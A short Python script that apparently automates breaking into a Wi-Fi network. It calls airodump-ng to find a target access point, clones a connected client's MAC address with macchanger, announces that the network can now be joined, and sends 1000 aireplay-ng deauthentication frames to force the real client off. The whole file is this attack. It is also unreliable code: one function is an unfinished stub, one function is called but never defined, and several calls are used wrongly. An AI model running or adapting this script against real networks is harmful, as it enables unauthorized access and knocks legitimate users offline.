#!/usr/bin/python

import sys
import pexpect

def verifyArguments():
	if len(sys.argv) < 2:
		error("Not enough arguments", "Error")

def findInfo(interface):
	child = pexpect.spawn("airodump-ng " + interface)

	data = child.expect_exact("DSA", timeout=10)

	for item in data.split("\n"):
		if "DSA" in item:
			words = item.split();

			return (words[0], words[5])

def getClientBSSID(channel, bssid, interface):
	child = pexpect.spawn("airodump-ng -c " + channel + " --bssid " + bssid + " " + interface)
	#TODO find client bssid

def maskAsClient(client_bssid, interface):
	child = pexpect.spawn("ifconfig " + interface + " down")
	child = pexpect.spawn("macchanger -m " + client_bssid)
	child = pexpect.spawn("ifconfig " + interface + " up")

def kickClient(client_bssid, ap_bssid, interface):
	child = pexpect.spawn("aireplay-ng -0 1000 -a " + ap_bssid + " -c " + client_bssid + " " + interface)

def main():
	verifyArguments()

	interface = sys.argv[1]

	channel, ap_bssid = findInfo(interface)

	client_bssid = getClientBSSID(channel, ap_bssid, interface)

	maskAsClient(client_bssid, interface)

	print("You should be able to connect to the network now")

	kickClient(client_bssid, ap_bssid, interface)

main()
